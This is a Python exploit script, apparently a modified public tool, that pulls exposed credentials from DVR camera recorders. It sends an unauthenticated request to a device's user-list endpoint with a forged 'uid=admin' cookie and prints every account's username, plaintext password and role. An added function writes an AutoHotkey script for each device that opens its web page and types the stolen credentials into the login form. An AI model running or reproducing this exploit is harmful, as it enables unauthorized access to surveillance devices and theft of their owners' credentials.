# -*- coding: utf-8 -*-
from __future__ import print_function
import json
import requests
import argparse
import tableprint as tp
import time
import os
import re

def remove_special_characters(input_string, replace_string):
    # Utiliser une expression régulière pour supprimer tous les caractères spéciaux
    clean_string = re.sub(r'[^a-zA-Z0-9\s]', replace_string, input_string)
    
    return clean_string

def create_ahk_script(login, password, url, file_name):
    # Contenu du script AutoHotkey avec les valeurs modifiées
    script_content = f"""
#Persistent  ; Pour que le script soit persistant
SetTitleMatchMode, 2  ; Pour que la recherche de la fenêtre d'Internet Explorer soit insensible à la casse et recherche n'importe où dans le titre

#NoEnv
SendMode Input

; Définir les informations de connexion
login := "{login}"
password := "{password}"

; URL à ouvrir
MyURL := "{url}"

; Ouvrir Internet Explorer et naviguer vers l'URL spécifiée.
Run, iexplore.exe %MyURL%

; Attend que la fenêtre d'Internet Explorer soit active et que le lien soit chargé
WinWaitActive, Internet Explorer

; Attend que le chargement de la page soit terminé
Loop {{
    Sleep, 1000  ; Attend 1 seconde entre chaque vérification du chargement
    WinGetTitle, CurrentTitle, A  ; Récupère le titre de la fenêtre active
    IfInString, CurrentTitle, Internet Explorer  ; Vérifie si le titre contient "- Internet Explorer"
        Break  ; Sort de la boucle dès que le titre est trouvé
}}

; Attendre que la page se charge pendant 3 secondes (ajustez selon vos besoins).
Sleep, 1000

; Attendre qu'un clic gauche soit effectué sur la page
SetTimer, WaitForClick, 100
return

WaitForClick:
    ; Vérifier si un clic gauche a été effectué sur la page
    if (GetKeyState("LButton", "P"))
    {{
		; Vérifier si la fenêtre active est dans Internet Explorer
        if (WinActive("ahk_class IEFrame"))
        {{
          ; MsgBox de confirmation de connexion
          MsgBox, 4, Confirmation %MyURL%, Voulez-vous vous connecter avec les identifiants suivants ?`nNom d'utilisateur : %login%`nMot de passe : %password%
          IfMsgBox No
            ExitApp
            
          ; Envoyer les identifiants de connexion
          SendInput, {{Tab}}%login%{{Tab}}

          Sleep, 1000

          SendInput, %password%{{Enter}}

          SetTimer, WaitForClick, Off  ; Arrêter de vérifier les clics
          
          ExitApp  ; Termine le script
        }}
    }}
return
    """
    
    # Créer le chemin complet du fichier .ahk dans le dossier spécifié
    file_path = os.path.join("ahk", file_name + ".ahk")

    # Écrire le contenu du script dans un fichier .ahk
    with open(file_path, "w") as file:
        file.write(script_content)
        file.close()  # Fermer le fichier après écriture

class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'

banner = '''
'''

details = ''' 
 # Exploit Title:   DVRs; Credentials Exposed
 # Date:            09/04/2018
 # Exploit Author:  Fernandez Ezequiel ( @capitan_alfa )
 # version: 1.2
'''
parser = argparse.ArgumentParser(prog='getDVR_Credentials.py',
                                description=' [+] Obtaining Exposed credentials', 
                                epilog='[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81')

parser.add_argument('--host',   dest="HOST",    help='Host',    required=True)
parser.add_argument('--port',   dest="PORT",    help='Port',    default=80)

args    =   parser.parse_args()

HST     =   args.HOST
port    =   args.PORT

headers = {}

fullHost_1  =   "http://"+HST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
host        =   "http://"+HST+":"+str(port)+"/"

#print(banner)

def makeReqHeaders(xCookie):
    headers["Host"]             =  host
    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
    headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"]       = "close"
    headers["Content-Type"]     = "text/html"
    headers["Cookie"]           = "uid="+xCookie
    
    return headers

try:
    rX = requests.get(fullHost_1,headers=makeReqHeaders(xCookie="admin"),timeout=10.000)
    print("*************************")
except Exception as e:
    #print(e)
    print("[+] Timed out")
    exit()

badJson = rX.text
try:
    dataJson = json.loads(badJson)
    totUsr = len(dataJson["list"])
except Exception as e:
    print(" [+] Error: "+str(e))
    print(" [>] json: "+str(rX))
    print("*************************")
    exit()

print("[+] DVR (url):\t\t"+str(host))
print("[+] Port: \t\t"+str(port))
print("[+] Users List:\t"+str(totUsr))
print(" ")

final_data = []
try:
    for obj in range(0,totUsr):

        temp = []

        _usuario    = dataJson["list"][obj]["uid"]
        _password   = dataJson["list"][obj]["pwd"]
        _role       = dataJson["list"][obj]["role"]

        print("[+] UserName:\t"+str(_usuario))
        print("[+] Password:\t"+str(_password))
        print("[+] RoleID:\t"+str(_role))
        
        create_ahk_script(_usuario, _password, host, remove_special_characters(host, "_"))

except Exception as e:
    print(" [!]: "+str(e))
    print(" [+] "+ str(dataJson))

print("*************************")

thanks = '''
[*] https://github.com/cclauss --> Accepted suggestion: compatibility with python 3 
'''